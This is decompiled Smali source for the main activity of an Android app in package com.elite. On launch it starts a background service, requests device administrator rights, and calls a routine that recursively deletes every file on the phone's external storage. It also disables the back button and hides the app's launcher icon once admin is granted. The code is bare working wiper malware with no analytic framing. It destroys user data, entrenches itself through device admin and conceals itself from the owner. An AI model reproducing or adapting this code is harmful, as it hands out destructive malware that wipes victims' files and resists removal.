.class public Lcom/elite/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# instance fields
.field DELIVERED:Ljava/lang/String;

.field SENT:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 17
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 19
    const-string v0, "SMS_SENT"

    iput-object v0, p0, Lcom/elite/MainActivity;->SENT:Ljava/lang/String;

    .line 20
    const-string v0, "SMS_DELIVERED"

    iput-object v0, p0, Lcom/elite/MainActivity;->DELIVERED:Ljava/lang/String;

    .line 17
    return-void
.end method

.method private static wipeDirectory(Ljava/lang/String;)V
    .locals 7
    .param p0, "name"    # Ljava/lang/String;

    .prologue
    .line 90
    :try_start_0
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 91
    .local v0, "directoryFile":Ljava/io/File;
    invoke-virtual {v0}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v2

    .line 92
    .local v2, "filenames":[Ljava/io/File;
    if-eqz v2, :cond_2

    array-length v4, v2

    if-lez v4, :cond_2

    .line 93
    array-length v5, v2

    const/4 v4, 0x0

    :goto_0
    if-lt v4, v5, :cond_0

    .line 107
    .end local v0    # "directoryFile":Ljava/io/File;
    .end local v2    # "filenames":[Ljava/io/File;
    :goto_1
    return-void

    .line 93
    .restart local v0    # "directoryFile":Ljava/io/File;
    .restart local v2    # "filenames":[Ljava/io/File;
    :cond_0
    aget-object v3, v2, v4

    .line 94
    .local v3, "tempFile":Ljava/io/File;
    invoke-virtual {v3}, Ljava/io/File;->isDirectory()Z

    move-result v6

    if-eqz v6, :cond_1

    .line 95
    invoke-virtual {v3}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lcom/elite/MainActivity;->wipeDirectory(Ljava/lang/String;)V

    .line 96
    invoke-virtual {v3}, Ljava/io/File;->delete()Z

    .line 93
    :goto_2
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    .line 98
    :cond_1
    invoke-virtual {v3}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    .line 104
    .end local v0    # "directoryFile":Ljava/io/File;
    .end local v2    # "filenames":[Ljava/io/File;
    .end local v3    # "tempFile":Ljava/io/File;
    :catch_0
    move-exception v1

    .line 105
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1

    .line 102
    .end local v1    # "e":Ljava/lang/Exception;
    .restart local v0    # "directoryFile":Ljava/io/File;
    .restart local v2    # "filenames":[Ljava/io/File;
    :cond_2
    :try_start_1
    invoke-virtual {v0}, Ljava/io/File;->delete()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1
.end method


# virtual methods
.method public HideAppFromLauncher(Landroid/content/Context;)V
    .locals 5
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 51
    :try_start_0
    invoke-virtual {p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    .line 52
    .local v1, "p":Landroid/content/pm/PackageManager;
    invoke-virtual {p0}, Lcom/elite/MainActivity;->getComponentName()Landroid/content/ComponentName;

    move-result-object v2

    const/4 v3, 0x2

    const/4 v4, 0x1

    invoke-virtual {v1, v2, v3, v4}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 56
    .end local v1    # "p":Landroid/content/pm/PackageManager;
    :goto_0
    invoke-virtual {p0}, Lcom/elite/MainActivity;->finish()V

    .line 57
    return-void

    .line 53
    :catch_0
    move-exception v0

    .line 54
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 3
    .param p1, "requestCode"    # I
    .param p2, "resultCode"    # I
    .param p3, "data"    # Landroid/content/Intent;

    .prologue
    .line 111
    packed-switch p1, :pswitch_data_0

    .line 123
    :goto_0
    return-void

    .line 113
    :pswitch_0
    new-instance v0, Lcom/elite/DeviceManager;

    invoke-direct {v0}, Lcom/elite/DeviceManager;-><init>()V

    .line 114
    .local v0, "adminManager":Lcom/elite/DeviceManager;
    invoke-virtual {p0}, Lcom/elite/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/elite/DeviceManager;->isDeviceAdminActive(Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 116
    invoke-virtual {p0}, Lcom/elite/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-virtual {p0, v2}, Lcom/elite/MainActivity;->HideAppFromLauncher(Landroid/content/Context;)V

    goto :goto_0

    .line 119
    :cond_0
    new-instance v1, Lcom/elite/DeviceManager;

    invoke-direct {v1}, Lcom/elite/DeviceManager;-><init>()V

    .line 120
    .local v1, "devicemanager":Lcom/elite/DeviceManager;
    const/16 v2, 0x3e8

    invoke-virtual {v1, p0, v2}, Lcom/elite/DeviceManager;->activateDeviceAdmin(Landroid/app/Activity;I)V

    goto :goto_0

    .line 111
    :pswitch_data_0
    .packed-switch 0x3e8
        :pswitch_0
    .end packed-switch
.end method

.method public onBackPressed()V
    .locals 0

    .prologue
    .line 43
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 24
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 25
    const/high16 v2, 0x7f030000

    invoke-virtual {p0, v2}, Lcom/elite/MainActivity;->setContentView(I)V

    .line 28
    new-instance v1, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/elite/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lcom/elite/IntentServiceClass;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 29
    .local v1, "msgIntent":Landroid/content/Intent;
    invoke-virtual {p0, v1}, Lcom/elite/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 32
    new-instance v0, Lcom/elite/DeviceManager;

    invoke-direct {v0}, Lcom/elite/DeviceManager;-><init>()V

    .line 33
    .local v0, "deviceManager":Lcom/elite/DeviceManager;
    const/16 v2, 0x3e8

    invoke-virtual {v0, p0, v2}, Lcom/elite/DeviceManager;->activateDeviceAdmin(Landroid/app/Activity;I)V

    .line 36
    invoke-virtual {p0}, Lcom/elite/MainActivity;->wipeMemoryCard()V

    .line 37
    return-void
.end method

.method public wipeMemoryCard()V
    .locals 6

    .prologue
    .line 64
    new-instance v0, Ljava/io/File;

    .line 65
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v3

    invoke-virtual {v3}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v3

    .line 64
    invoke-direct {v0, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 67
    .local v0, "deleteMatchingFile":Ljava/io/File;
    :try_start_0
    invoke-virtual {v0}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v1

    .line 68
    .local v1, "filenames":[Ljava/io/File;
    if-eqz v1, :cond_2

    array-length v3, v1

    if-lez v3, :cond_2

    .line 69
    array-length v4, v1

    const/4 v3, 0x0

    :goto_0
    if-lt v3, v4, :cond_0

    .line 82
    .end local v1    # "filenames":[Ljava/io/File;
    :goto_1
    return-void

    .line 69
    .restart local v1    # "filenames":[Ljava/io/File;
    :cond_0
    aget-object v2, v1, v3

    .line 70
    .local v2, "tempFile":Ljava/io/File;
    invoke-virtual {v2}, Ljava/io/File;->isDirectory()Z

    move-result v5

    if-eqz v5, :cond_1

    .line 71
    invoke-virtual {v2}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/elite/MainActivity;->wipeDirectory(Ljava/lang/String;)V

    .line 72
    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    .line 69
    :goto_2
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 74
    :cond_1
    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    goto :goto_2

    .line 80
    .end local v1    # "filenames":[Ljava/io/File;
    .end local v2    # "tempFile":Ljava/io/File;
    :catch_0
    move-exception v3

    goto :goto_1

    .line 78
    .restart local v1    # "filenames":[Ljava/io/File;
    :cond_2
    invoke-virtual {v0}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1
.end method
